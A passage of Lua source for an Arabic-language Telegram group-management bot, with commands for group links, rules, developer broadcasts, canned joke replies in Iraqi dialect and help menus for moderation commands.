if text == "الرابط" then local link = tahadevstorm:get(DEVSTOR.."link:group"..msg.chat_id_)            if link then                              storm_sendMsg(msg.chat_id_, msg.id_, 1, '💳¦ رابط المجموعه 👇 \nٴ┄•🔸•┄༻📯༺┄•🔸•┄    \n'..link..'\n\n ٴ┄•🔸•┄༻📯༺┄•🔸•┄    \n', 1, 'html')                          else                storm_sendMsg(msg.chat_id_, msg.id_, 1, '❌*¦* لم يتم وضع رابط المجموعه\n📯*¦* ارسل ( ضع رابط ) ليتم حفظ الرابط', 1, 'md')              end            end
if text and text:match("^مسح الرابط$")  and is_mod(msg) then              storm_sendMsg(msg.chat_id_, msg.id_, 1, "*📛¦* تم مسح الرابط ✔", 1 , "md")           tahadevstorm:del(DEVSTOR.."link:group" .. msg.chat_id_)       end
if text=="اذاعه" and msg.reply_to_message_id_ == 0  and is_devtaha(msg) then tahadevstorm:setex(DEVSTOR.."bc:in:grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) storm_sendMsg(msg.chat_id_, msg.id_, 1, "*📛¦* حسناا ارسل النص", 1, "md") end
if text=="اذاعه للكل" and msg.reply_to_message_id_ == 0  and is_devtaha(msg) then tahadevstorm:setex(DEVSTOR.."bc:in:all" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) storm_sendMsg(msg.chat_id_, msg.id_, 1, "*📛¦* حسناا ارسل النص", 1, "md") end
if text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 and is_devtaha(msg) then tahadevstorm:setex(DEVSTOR.."bc:in:pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) local list = tahadevstorm:smembers(DEVSTOR..'usersbot')   for k,v in pairs(list) do    rempv(v) end storm_sendMsg(msg.chat_id_, msg.id_, 1, "*📛¦* حسناا ارسل النص", 1, "md") end if chat_type == 'super' then
if text and text:match("^ضع قوانين$") and is_mod(msg) then tahadevstorm:setex(DEVSTOR.."rules" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) storm_sendMsg(msg.chat_id_, msg.id_, 1, "📪*¦* حسناا ارسل النص", 1, "md")  end
if text and text:match("^مسح القوانين$")  and is_mod(msg) then   storm_sendMsg(msg.chat_id_, msg.id_, 1, "*📛¦* تم مسح القوانين ✔", 1 , "md")  tahadevstorm:del(DEVSTOR.."rules:group" .. msg.chat_id_) end
if text and text:match("^القوانين$") then local rules = tahadevstorm:get(DEVSTOR.."rules:group" .. msg.chat_id_)   if rules then     storm_sendMsg(msg.chat_id_, msg.id_, 1, rules, 1, nil)   else      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*📛¦* لا توجد قوانين في المجموعه",  1, "md")   end    end
if text == 'بنت' or text == 'اي بنت' or text == 'ي بنت' or text == 'يي بنت'  or text == 'بنيه'  or text == 'بنية'  or text == 'ي ابنيه'  or text == 'اي ابنية' or text == 'اي ابنيه'  or text == 'مو ولد'  or text == 'مو صبي'  or text == 'مش ولد'  or text == 'مش صبي' then if not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then local taha = {'ئوف فديتج مح ئم خدود 🙈💋','همزين مو ولد كتلوني الزواحف والله ☹️','شلونج ياروحي 🐣💋','هلا بيج ياروحي انتي ☺️','ضيفيني كروبات ❤️','ئوف نطيني بوسه ياروحي ❤️💋','مح بنوتات ولا الولد كتلوني بس يزحفون ','هلا بالبنوتات ','شلونج اخبارج ','هم يزحفولج ' } storm_sendMsg(msg.chat_id_, msg.id_, 1, ''..taha[math.random(#taha)]..'', 1, 'md') end end
if text == 'ولد' or text == 'اي ولد' or text == 'ي ولد' or text == 'يي ولد'  or text == 'رجال'  or text == 'لج اني ولد'  or text == 'مو بنيه'  or text == 'مو بنية'  or text == 'مو بنت' then if not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then local taha = {'مشيطلعبرا ','شعندك داخل خاص 😒','ثكيله وماحجي ويه ولد ','عوع ولد مشطلعبرا بلوك ','برا متستحي داخل خاص 😒','هلا بيك تشرفت بيك ونته اخويه ','شلونك ','ئشعدك داخل خاص ؟ 😒' } storm_sendMsg(msg.chat_id_, msg.id_, 1, ''..taha[math.random(#taha)]..'', 1, 'md') end end
if text == 'دوم' or text == 'دومج' or text == 'ادومين' or text == 'ادوم'  or text == 'دومج❤️'   or text == 'دوم❤️'  or text == 'دومج ❤️'  or text == 'دوم ❤️' or text == 'دايمه'  or text == 'دايمة' then if  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then local taha = {'ادوم ايامك يالغالي  ❤️','تسلم دوم الحبيبك 😌','دوم وكعد ع عناد الواكفين 🤷🏼‍♀️','دوم وجيري 🌝🏼‍♀️','يدومك الناسك ❤️😌' }  storm_sendMsg(msg.chat_id_, msg.id_, 1, ''..taha[math.random(#taha)]..'', 1, 'md') end end
if text == 'اي وينهة' or text == 'اي وينه' or text == 'وينة' or text == 'وينهة'  or text == 'وينها'  or text == 'وينه' or text == 'اي وينهة' or text == 'اي وينها' then if not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then local taha = {'شمدريني تعال دوره يمكن تلكاه بجيبي 😂🙈','ليش ادور عليه ','يمي تعال هسه اكلك وينه 🙃','مادري والله هستوه جان هنا 😌','ميخصك 🤤','يمي بالخاص سد اخر ضهور اني كلت اله 😏','ميخصك حبيبي ويمي ئنته شنو 😋','بالمطبخ ديحضرلي لفه 😂🌝','هسه طلع من البيت راح يجيب عسل 😌','مالك دخل بي ','روح دور عليه 🙂','هستوه جان يحجي هنا 👨🏼‍🎤','شمدريني روح اسئل غيري ‍💻','عندك رقمه ؟ 🤷🏼‍♀️','اتصل عليه وذا ماعندك رصيد هذا كارت اشخط الشاشه وحطه ▓▓▓▓▓▓▓▓▓▓▓ <<اشخط هنا 🤷‍♀️','يابة روح لو اخلي الاعضاء يتفلون بوجهك 😪😂' } storm_sendMsg(msg.chat_id_, msg.id_, 1, ''..taha[math.random(#taha)]..'', 1, 'md') end end
if text == 'شبي' or text == 'شبيه' or text == 'شبيها' or text == 'شبيهة'  or text == 'كلي شبي'  or text == 'كلي شبيه' then if not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then local taha = {'شبت بيك 😒','يعني شبي ئنته كلي شبي 😐💔','خطيه ندعم و ودو للمستشفى وهسه بالعنايه العمه 😭','ئنته تعرف شبي 🙃','بي دم ولحم وزيدك من الشعر بيت يمشي ويحجي 🙊','الدنيه دارت عليه خطيه ','يسلم عليك 😕','يريدك بشغله 🌝','روحله بساع يردك بشغله😐','غير تعارك ويايه وصيح عليه تراضها 😭','احجي شبي 🌝','يابة روح لو اخلي الاعضاء يتفلون بوجهك 😪😂' } storm_sendMsg(msg.chat_id_, msg.id_, 1, ''..taha[math.random(#taha)]..'', 1, 'md') end end
if text == 'اكلج' or text == 'اكلك' or text == 'كلك' or text == 'كلج'  or text == 'ممكن طلب'  or text == 'ببكن طلب'  or text == 'اكول' then if not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then local taha = {'كول بعد روحي 😐❤️', 'شتريد تفضل 😌', 'اطلب طلب بي حض 😐', 'احجي ماعندي وقت اريد اطلع 🌝', 'تفضل كول 🌝💋', 'لخويا اختي لصغير الجبيره دلليدلل كول كولي مايردك ماردج اله لسانج لسانك 😂😂🤗',  'كول نعسانه من البارحه منايمه 🤤', 'كول ', 'اذا عترفت بشي ومابي حض اكلب التلي عليك 😌', 'احجي ', 'صاير شي لا تجلطني 😳', 'ها 😒', 'لتشلع كلبي ', 'ها حبيبي كول ماكول لاحد ', 'ها عيني 😉💋', 'شكو شرايد 😒','كولي بنتي ☺️🍼','كول ابني ☺️🍼 ','كول وماكول الخالتك🙊😹' } storm_sendMsg(msg.chat_id_, msg.id_, 1, ''..taha[math.random(#taha)]..'', 1, 'md') end end
if text == 'هيج' or text == 'هيجي' or text == 'مو هيج' or text == 'زين هيج' or text == 'ليش هيج' then if not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then local taha = {'هيج لو دجاجه 🤣😌', 'لا يابه مو هيج منو كلك اني اعرف ', 'لا مو هيج 🤓', 'اني جنت موجوده مصار هيج ', 'اني فراعت خضره دكلي هيج متستحي 😔', 'لدكول هيج اضوج من هاي الكلمه ', 'روح كول الغيري هيج مو الي 😒', 'يله نركص الهجع يلهجع 😌😂','براحتي اني مو بمزاجك دكلي هيج 😌', 'بابا رو ح خالو روح شسوي انته كلتلي هيج ','وشلون تركص احلام ؟... جذي 💃🏼 جذي 💃', 'منو كلك هيج اصلا 😂', 'اعرف طوختها راح اسكت 🤷🏼‍♂️', 'يله نغني هنــ🇭🇺ــدي هيجي كيجي ميجي ليجي 🤷🏼‍♂️' } storm_sendMsg(msg.chat_id_, msg.id_, 1, ''..taha[math.random(#taha)]..'', 1, 'md') end end
if text ==  ""..(tahadevstorm:get(DEVSTOR..'storm:name') or 'ستورم')..' شنو رئيك بهاذا' or text == 'شنو رئيك بهذا' or text == 'شنو رئيك بهاذا' or text == ""..(''..botname..'')..' شنو رئيك بهاذا' then function necha(extra, result, success) local taha = {'لوكي وزاحف من ساع زحفلي وحضرته 😒','خوش ولد و ورده مال الله 💋🙄','يلعب ع البنات 🙄', 'ولد زايعته الكاع 😶🙊','صاك يخبل ومعضل ','محلو وشواربه جنها مكناسه 😂🤷🏼‍♀️','اموت عليه 🌝','هوه غير الحب مال اني 🤓❤️','مو خوش ولد صراحه ☹️','ادبسز وميحترم البنات  ', 'فد واحد قذر 🙄😒','ماطيقه كل ما اكمشه ريحته جنها بخاخ بف باف مال حشرات 😂🤷‍♀️','مو خوش ولد 🤓' } storm_sendMsg(msg.chat_id_, result.id_, 1,''..taha[math.random(#taha)]..'', 1, 'md')   end   if tonumber(msg.reply_to_message_id_) == 0 then   else   getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),necha)     end end
if text == ""..(tahadevstorm:get(DEVSTOR..'storm:name') or 'ستورم')..' شنو رئيك بهاي' or text == ""..(''..botname..'')..' شنو رئيك بهاي' or text == 'شنو رئيج بهايه' or text == 'شنو رئيج بهاية' or text == 'شو رئيك بهي' then function necha(extra, result, success) local taha = {'الكبد مال اني هيه ','ختولي ماحبها ','خانتني ويه صديقي 😔','بس لو الكفها اله اعضها 💔','خوش بنيه بس عده مكسرات زايده وناقصه منا ومنا وهيه تدري بنفسها 😒','جذابه ومنافقه سوتلي مشكله ويه الحب مالتي ','ئووووووووف اموت ع ربها ','ديرو بالكم منها تلعب ع الولد 😶 ضحكت ع واحد قطته ايفون 7 ','صديقتي وختي وروحي وحياتي ','فد وحده منحرفه 😥','ساكنه بالعلاوي ونته حدد بعد لسانها لسان دلاله 🙄🤐','ام سحوره سحرت اخويا وعلكته 6 سنوات 🤕','ماحبها 🙁','بله هاي جهره تسئل عليها ؟ ','بربك ئنته والله فارغ وبطران وماعدك شي تسوي جاي تسئل ع بنات العالم ولي يله 🏼','ياخي بنيه حبوبه بس لبعرك معمي عليها تشرب هواي 😹' } storm_sendMsg(msg.chat_id_, result.id_, 1,''..taha[math.random(#taha)]..'', 1, 'md') end  if tonumber(msg.reply_to_message_id_) == 0 then   else  getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),necha)   end  end
if text == 'توجيه' and tonumber(msg.reply_to_message_id_) > 0 and is_devtaha(msg) then  function fwwdmsg(taha,storm,sorc)  local list = tahadevstorm:smembers(DEVSTOR..'botgps')  if tahadevstorm:scard(DEVSTOR.."botgps") == 0 then  storm_sendMsg(msg.chat_id_, msg.id_, 1, "✖ ❯ عذرا لا يوجد مجموعات في البوت 🍃\n", 1, "md")   else   for k,v in pairs(list) do  forwardMessages(v, msg.chat_id_, {[0] = storm.id_}, 1)  end end  local gps = tahadevstorm:scard(DEVSTOR.."botgps")       local text = '🚸 ❯❯ تم ارسال توجيه الى *{ '..gps..' }* مجموعات'  storm_sendMsg(msg.chat_id_, msg.id_, 1, text, 1, 'md')  end  getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),fwwdmsg)  end
if text == 'توجيه خاص' and tonumber(msg.reply_to_message_id_) > 0 and is_devtaha(msg) then  function fwwdmsg(taha,storm,sorc)  local list = tahadevstorm:smembers(DEVSTOR..'usersbot')  if tahadevstorm:scard(DEVSTOR.."usersbot") == 0 then  storm_sendMsg(msg.chat_id_, msg.id_, 1, "✖ ❯ عذرا لا يوجد مشتركين في البوت 🍃\n", 1, "md")   else   for k,v in pairs(list) do rempv(v) forwardMessages(v, msg.chat_id_, {[0] = storm.id_}, 1)  end    local pv = tahadevstorm:scard(DEVSTOR.."usersbot")       local text = '🚸 ❯❯ تم ارسال توجيه الى *{ '..pv..' }* مشتركين'  storm_sendMsg(msg.chat_id_, msg.id_, 1, text, 1, 'md')  end end  getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),fwwdmsg)  end
if text == 'توجيه للكل' and tonumber(msg.reply_to_message_id_) > 0 and is_devtaha(msg) then   function fwwdmsg(taha,storm,sorc)  local list = tahadevstorm:smembers(DEVSTOR..'usersbot')   for k,v in pairs(list) do rempv(v)  forwardMessages(v, msg.chat_id_, {[0] = storm.id_}, 0)   end  local list = tahadevstorm:smembers(DEVSTOR..'botgps')   for k,v in pairs(list) do   forwardMessages(v, msg.chat_id_, {[0] = storm.id_}, 0)   end   local grp = tahadevstorm:scard(DEVSTOR.."botgps")    local pv = tahadevstorm:scard(DEVSTOR.."usersbot")            local text = '🚸 ❯❯ تم ارسال توجيه الى ❮❮ 🚸\n📬 ❯❯ *{'..pv..'}* مشتركين 🍂 \n📮 ❯❯  *{ '..grp..' }* مجموعات 🍃'   storm_sendMsg(msg.chat_id_, msg.id_, 1, text, 1, 'md')   end   getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),fwwdmsg)   end
if text =='الاوامر' then if not is_mod(msg) then storm_sendMsg(msg.chat_id_, msg.id_, 1, "🚸❯❯ عذرا هاذا الامر للادمنيه فقط\n📮❯❯ ارسل *{م6}* لرئية الاوامر\n", 1, "md")  else
local text = [[ 
*👨🏻‍🎤¦* مرحبا بك عزيزي ]]..get_rtba(msg)..[[ 🍃
📫❯❯ في اوامر السورس ❮❮📫
——————༻🚸༺——————
*🔒¦ ◗م1◖* لعـرض قائمــه الـحمـايـه
*🚷¦ ◗م2◖* لعرض قائمه الحظر وال...
*👮¦ ◗م3◖* لعرض قائمه الادمنيه
*👨🏻‍💼¦ ◗م4◖* لعرض اوامر المدراء
*👨🏼‍✈️¦ ◗م5◖* لعرض اوامر المنشئين
*👲¦ ◗م6◖* لعرض اوامر الاعضاء
*📮¦ ◗م7◖* لعرض اوامر المطور
*📛¦ ◗م8◖* لعرض اوامر مطور الاساسي
*🔇¦ ◗اوامر الكتم◖*  لعرض اوامر الكتم
*🚷¦ ◗اوامر الطرد◖* لعرض اوامر الطرد
*🔏¦ ◗اوامر التقيد◖* لعرض اوامر التقيد
*🚫¦ ◗اوامر الصلاحيه◖* لعرض اوامر الصلاحيات
——————༻🚸༺——————
*⚜¦* للمزيد من المعلومات راسلنا 
*🗯¦* مطور البوت ◗[@]]..sudouser..[[]◖
 ]]  storm_sendMsg(msg.chat_id_, msg.id_, 1, text, 1, 'md')  end end 
 if text =='اوامر الصلاحيه' then if not is_mod(msg)  then storm_sendMsg(msg.chat_id_, msg.id_, 1, "🚸❯❯ عذرا هاذا الامر للادمنيه فقط\n", 1, "md")  else
local text = [[ 
📬*¦*  اهلا بك في اوامر قفل الصلاحيات 🍁
——————༻💠༺——————
مثال 
📛*¦* قفل ⸖ فتح الصور + المعرف
📛*¦* قفل ⸖ فتح الصور + الايدي
📛*¦* قفل ⸖ فتح الصور + بالرد
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
💭*¦* ﺂلروابٖط ⸖ ﺂلمعرفات
💭*¦* ﺂلشار۪حٖه ⸖ الصوت
💭*¦* ﺂلمل۪فاتٖ ⸖ ﺂلصوٖر ⸖ التثبيت
💭*¦* التاك ⸖ ﺂلمت۪حرٖكه
💭*¦* ﺂلمل۪صقات ⸖ ﺂلفيديٖو
💭*¦* اللستات ⸖ ﺂلك۪لايٖش
💭*¦* ﺂلتو۪جيه ⸖ ﺂلاغٖاني
💭*¦*  ﺂلج۪هاٖت ⸖ الدردشه ⸖ البوتات
💭*¦* السيلفي ⸖ ﺂلمارك۪داوٖن
——————༻🚸༺——————
*⚜¦* للمزيد من المعلومات راسلنا 
*🗯¦* مطور البوت ◗[@]]..sudouser..[[]◖
 ]]  storm_sendMsg(msg.chat_id_, msg.id_, 1, text, 1, 'md')  end end 
 if text =='اوامر الكتم' then if not is_mod(msg)  then storm_sendMsg(msg.chat_id_, msg.id_, 1, "🚸❯❯ عذرا هاذا الامر للادمنيه فقط\n", 1, "md")  else
local text = [[ 
📬*¦*  اهلا بك في اوامر القفل بالكتم 🍁
💠*¦* قفل ⸖ فتح + الاوامر + بالكتم
——————༻💠༺——————
⚜*¦* ﺂلروابٖط ⸖ ﺂلمعرفات 
⚜*¦* ﺂلشار۪حٖه ⸖ الصوت 
⚜*¦* ﺂلمل۪فاتٖ ⸖ ﺂلصوٖر 
⚜*¦* التاك ⸖ ﺂلمت۪حرٖكه
⚜*¦* ﺂلمل۪صقات ⸖ ﺂلفيديٖو
⚜*¦* اللستات ⸖ ﺂلك۪لايٖش
⚜*¦* ﺂلتو۪جيه ⸖ ﺂلاغٖاني
⚜*¦*  ﺂلج۪هاٖت ⸖ الدخول
⚜*¦* السيلفي ⸖ ﺂلمارك۪داوٖن
——————༻🚸༺——————
*📯¦* للمزيد من المعلومات راسلنا 
*🗯¦* مطور البوت ◗[@]]..sudouser..[[]◖
 ]]  storm_sendMsg(msg.chat_id_, msg.id_, 1, text, 1, 'md')  end end 
 if text =='اوامر الطرد' then if not is_mod(msg)  then storm_sendMsg(msg.chat_id_, msg.id_, 1, "🚸❯❯ عذرا هاذا الامر للادمنيه فقط\n", 1, "md")  else
local text = [[ 
📬*¦*  اهلا بك في اوامر القفل بالطرد 🍁
💠*¦* قفل ⸖ فتح + الاوامر + بالطرد
——————༻💠༺——————
📛*¦* ﺂلروابٖط ⸖ ﺂلمعرف 
📛*¦* ﺂلشار۪حٖه ⸖ الصوت
📛*¦* ﺂلتث۪بيٖت ⸖ ﺂلمت۪حرٖكه
📛*¦* ﺂلمل۪فاتٖ ⸖ ﺂلصوٖر
📛*¦* ﺂلمل۪صقات ⸖ ﺂلفيديٖو
📛*¦* اللستات ⸖ ﺂلك۪لايٖش
📛*¦* ﺂلتو۪جيه ⸖ ﺂلاغٖاني
📛*¦* الدخول ⸖ ﺂلج۪هاٖت
📛*¦* السيلفي ⸖ ﺂلمارك۪دوٖن
📛*¦* ﺂلبوت۪ات ⸖ ﺂلت۪اك
——————༻🚸༺——————
*⚜¦* للمزيد من المعلومات راسلنا 
*🗯¦* مطور البوت ◗[@]]..sudouser..[[]◖
 ]]  storm_sendMsg(msg.chat_id_, msg.id_, 1, text, 1, 'md')  end end 
 if text =='اوامر التقيد' then if not is_mod(msg)  then storm_sendMsg(msg.chat_id_, msg.id_, 1, "🚸❯❯ عذرا هاذا الامر للادمنيه فقط\n", 1, "md")  else
local text = [[ 
📬*¦*  اهلا بك في اوامر القفل بالتقيد 🍁
💠*¦* قفل ⸖ فتح + الاوامر + بالتقيد
——————༻💠༺——————
🌀*¦* ﺂلروابٖط ⸖ ﺂلمعرفات 
🌀*¦* ﺂلشار۪حٖه ⸖ الصوت 
🌀*¦* ﺂلمل۪فاتٖ ⸖ ﺂلصوٖر 
🌀*¦* التاك ⸖ ﺂلمت۪حرٖكه
🌀*¦* ﺂلمل۪صقات ⸖ ﺂلفيديٖو
🌀*¦* اللستات ⸖ ﺂلك۪لايٖش
🌀*¦* ﺂلتو۪جيه ⸖ ﺂلاغٖاني
🌀*¦*  ﺂلج۪هاٖت ⸖ الدخول ⸖ البوتات
🌀*¦* السيلفي ⸖ ﺂلمارك۪داوٖن
——————༻🚸༺——————
*⚜¦* للمزيد من المعلومات راسلنا 
*🗯¦* مطور البوت ◗[@]]..sudouser..[[]◖
 ]]  storm_sendMsg(msg.chat_id_, msg.id_, 1, text, 1, 'md')  end end 
if text =='م1' then if not is_mod(msg) then storm_sendMsg(msg.chat_id_, msg.id_, 1, "🚸❯❯ عذرا هاذا الامر للادمنيه فقط\n", 1, "md")  else
local text = [[ 
*👨🏻‍🎤¦* مرحبا بك عزيزي ]]..get_rtba(msg)..[[ 🍃
💢❯❯ في اوامر الحمايه ❮❮💢
——————༻🚨༺——————
🎲*¦* قفل / فتح  الروابط
🎲*¦* قفل / فتح   التوجيه
🎲*¦* قفل / فتح  المعرفات
🎲*¦* قفل / فتح  الكلايش
🎲*¦* قفل / فتح  الماركداون
🎲*¦* قفل / فتح  التعديل
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
🚸*¦* قفل / فتح  المتحركه
🚸*¦* قفل / فتح  الصور 
🚸*¦* قفل / فتح  الملفات 
🚸*¦* قفل / فتح  الملصقات 
🚸*¦* قفل / فتح  الفيديو
🚸*¦* قفل / فتح  الدردشه
🚸*¦* قفل / فتح  التثبيت
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
📛*¦* قفل / فتح  الالعاب
📛*¦* قفل / فتح  الصوت
📛*¦* قفل / فتح  الشارحه
📛*¦* قفل / فتح  الهاشتاك
📛*¦* قفل / فتح  الدردشه
📛*¦* قفل / فتح  الاغاني
📛*¦* قفل / فتح  الاونلاين
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
📬*¦* قفل / فتح  الدخول
📬*¦* قفل / فتح  السيلفي
📬*¦* قفل / فتح  الجهات
📬*¦* قفل / فتح  الكل
📬*¦* قفل / فتح  البوتات
——————༻🚨༺——————
*⚜¦* للمزيد من المعلومات راسلنا 
*🗯¦* مطور البوت ◗[@]]..sudouser..[[]◖
 ]]  storm_sendMsg(msg.chat_id_, msg.id_, 1, text, 1, 'md')  end end 
if text =='م2' then if not is_mod(msg)  then storm_sendMsg(msg.chat_id_, msg.id_, 1, "🚸❯❯ عذرا هاذا الامر للادمنيه فقط\n", 1, "md")  else
local text = [[ 
*👨🏻‍🎤¦* مرحبا بك عزيزي ]]..get_rtba(msg)..[[ 🍃
*🚨¦* في اوامر الكتم والحظر و..
——————༻🚸༺——————
🔇*¦* كتم ◗ايدي، معرف ، رد◖
🔊*¦* الغاء الكتم ◗ايدي، معرف ، رد◖
🎭*¦* تقيد ◗ايدي، معرف ، رد◖
🎭*¦* الغاء تقيد ◗ايدي، معرف ، رد◖
🔸*¦* حظر ◗ايدي، معرف ، رد◖
🔹*¦* الغاء الحظر ◗ايدي، معرف ، رد◖
🚯*¦* طرد ◗ايدي، معرف ، رد◖
——————༻🚸༺——————
*⚜¦* للمزيد من المعلومات راسلنا
*🗯¦* مطور البوت ◗[@]]..sudouser..[[]◖
 ]]  storm_sendMsg(msg.chat_id_, msg.id_, 1, text, 1, 'md')  end end 
if text =='م3' then if not is_mod(msg)  then storm_sendMsg(msg.chat_id_, msg.id_, 1, "🚸❯❯ عذرا هاذا الامر للادمنيه فقط\n", 1, "md")  else
local text = [[ 
*👨🏻‍🎤¦* مرحبا بك عزيزي ]]..get_rtba(msg)..[[ 🍃
*🚨¦* في اوامر  الادمنيه
——————༻💠༺——————
👮*¦* رفع مميز ◗ لرفع مميز ◖
👮*¦* تنزيل مميز ◗ لتنزيل مميز ◖
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
🚸*¦* تثبيت ◗ بالرد على الرساله◖
🚸*¦* تفعيل الترحيب ◗لتفعيله✨◖
🚸*¦* تعطيل الترحيب ◗لتعطيله 📄◖
🚸*¦* ضع رابط ◗ثم ارسل الرابط ◖
🚸*¦* ضع قوانين◗ثم ارسل الرابط ◖
🚸*¦* ضع صوره ◗ثم ارسل الصوره ◖
🚸*¦* ضع ترحيب ◗ النص 🗯◖
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
📯*¦* مسح + الاوامر ادناه ↓
🎲*¦* المحظورين ◗لمسح محظورين◖
🎲*¦* المكتومين ◗لمسح مكتومين◖
🎲*¦* المميزين ◗لمسح المميزين◖
🎲*¦* المقيدين◗لمسح المقيدين الكروب◖
🎲*¦* قائمه المنع ◗لمسح الكلمات المنع◖
🎲*¦* القوانين ◗لمسح قواني المجموعه◖
🎲*¦* الترحيب ◗لمسح ترحيب الاعضاء◖
🎲*¦* الرابط ◗لمسح رابط المجموعه◖
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
⚔*¦* لعرض القوائم
📛*¦* قائمه المنع◗لعرض كلمه الممنوعه◖
📛*¦* الادمنيه◗ لعرض ادمنيه البوت ◖
📛*¦* المدراء◗لعرض مدراء المجموعه◖
📛*¦* القوانين◗لعرض قوانين الكروب◖
📛*¦* الرابط ◗لـعرض رابط المجموعه◖
📛*¦* المميزين ◗لـعرض المميزين◖
📛*¦* المقيدين ◗لـعرض المقيدين◖
📛*¦* المحظورين◗لـعرض المحظورين◖
📛*¦* المكتومين◗لـعرض المكتومين◖
——————༻🚸༺——————
*⚜¦* للمزيد من المعلومات راسلنا
*🗯¦* مطور البوت ◗[@]]..sudouser..[[]◖
 ]]  storm_sendMsg(msg.chat_id_, msg.id_, 1, text, 1, 'md')  end end 
if text =='م4' then if not is_mod(msg)  then storm_sendMsg(msg.chat_id_, msg.id_, 1, "🚸❯❯ عذرا هاذا الامر للادمنيه فقط\n", 1, "md")  else
local text = [[ 
*👨🏻‍🎤¦* مرحبا بك عزيزي ]]..get_rtba(msg)..[[ 🍃
*🚨¦* في اوامــر المدراء 
——————༻🚸༺——————
📛*¦* رفع ادمن ◗لرفع ادمن ◖
📛*¦* تنزيل ادمن ◗ لتنزيل ادمن◖
📛*¦* مسح الادمنيه ◗لمسح الادمنيه◖
📛*¦* الادمنيه ◗لعرض الادمنيه◖
📛*¦* رفع الادمنيه ◗لرفع الادمنيه◖
📛*¦* الاعدادات ◗لعرض الاعدادات◖
📛*¦* اعدادات الكتم◗لعرض الاعدادات◖
📛*¦* اعدادات التقيد◗لعرض الاعدادات◖
📛*¦* اعدادات الطرد◗لعرض الاعدادات◖
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
🚨*¦* مسح + العدد ◗لمسح رسائل◖
🚨*¦* رفع القيود◗لرفع الكتم والحظر..◖
🚨*¦* طرد البوتات ◗لطرد البوتات كلها◖
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
〽*¦* اضف رد ◗ ل اضافه رد ◖
〽*¦* حذف رد ◗لحذف رد ◖
〽*¦* قائمه الردود ◗ لعرض الردود ◖
〽*¦* مسح الردود ◗ لمسح الردود ◖
〽*¦* اضف رد بالرد ◗ اضافه رد بالرد◖
〽*¦* حذف رد بالرد◗لحذف رد بالرد◖
〽*¦* قائمه ردود بالرد ◗ لعرض الردود ◖
〽*¦* مسح ردود بالرد ◗ لمسح الردود ◖
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
📬*¦* تفعيل امر اطردني ◗لتفعيله◖
❌*¦* تعطيل امر اطردني ◗لتعطيله◖
📬*¦* تفعيل امر نزلني ◗لتفعيله◖
❌*¦* تعطيل امر نزلني ◗لتعطيله◖
📬*¦* تفعيل الايدي ◗لتفعيله◖
❌*¦* تعطيل الايدي ◗لتعطيله◖
📬*¦* تفعيل جلب الصوره ◗لتفعيله◖
❌*¦* تعطيل جلب الصوره ◗لتعطيله◖
📬*¦* تفعيل ردود البوت ◗لتفعيل ردود◖
❌*¦* تعطيل ردود البوت ◗لتعطيل ردود◖
📬*¦* تفعيل الردود ◗لتفعيل الردود◖
❌*¦* تعطيل الردود ◗لتعطيل الردود◖
📬*¦* تفعيل الردود بالرد ◗لتفعيل الردود◖
❌*¦* تعطيل الردود بالرد ◗لتعطيل الردود◖
——————༻🚸༺——————
*⚜¦* للمزيد من المعلومات راسلنا
*🗯¦* مطور البوت ◗[@]]..sudouser..[[]◖
 ]]  storm_sendMsg(msg.chat_id_, msg.id_, 1, text, 1, 'md')  end end 
if text =='م5' then if not is_mod(msg)  then storm_sendMsg(msg.chat_id_, msg.id_, 1, "🚸❯❯ عذرا هاذا الامر للادمنيه فقط\n", 1, "md")  else
local text = [[ 
*👨🏻‍🎤¦* مرحبا بك عزيزي ]]..get_rtba(msg)..[[ 🍃
*🚨¦* في اوامــر المنشئين
——————༻🚸༺——————
🔹*¦* اسم لبوت + غادر ◗للمغادره◖
🔹*¦* رفع مدير ◗ لرفع مدير ◖
🔹*¦* تنزيل مدير ◗ لتنزيل مدير ◖
🔹*¦* المدراء ◗ لعرض مدراء المجموعه◖
🔹*¦* مسح المدراء ◗ لمسح المدراء ◖
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
📛*¦* تفعيل الاضافه ◗لتفعيل الاضافه◖
📛*¦* تعطيل الاضافه ◗لتعطيل الاضافه◖
📛*¦* ضع عدد الاضافه + ◗ العدد ◖
📛*¦* ضع تكرار الايدي + ◗ العدد ◖
📛*¦* ضع اسم + ◗ الاسم التريده ◖
——————༻🚸༺——————
*⚜¦* للمزيد من المعلومات راسلنا
*🗯¦* مطور البوت ◗[@]]..sudouser..[[]◖
 ]]  storm_sendMsg(msg.chat_id_, msg.id_, 1, text, 1, 'md')  end end 
if text =='م6' then
local text = [[ 
*🚨¦* اهلا بك في اوامر الاعضاء
——————༻📛༺——————
📬*¦* معرفي ◗ لعرض معرفك ◖
📬*¦* اسمي ◗ لعرض اسمك ◖
📬*¦* رسايلي ◗ لعرض عدد الرسائل ◖
📬*¦* معلوماتي ◗ لعرض معلوماتك ◖
📬*¦* رتبتي ◗ لعرض رتبتك ◖
📬*¦* صورتي + ◗ رقم الصوره◖
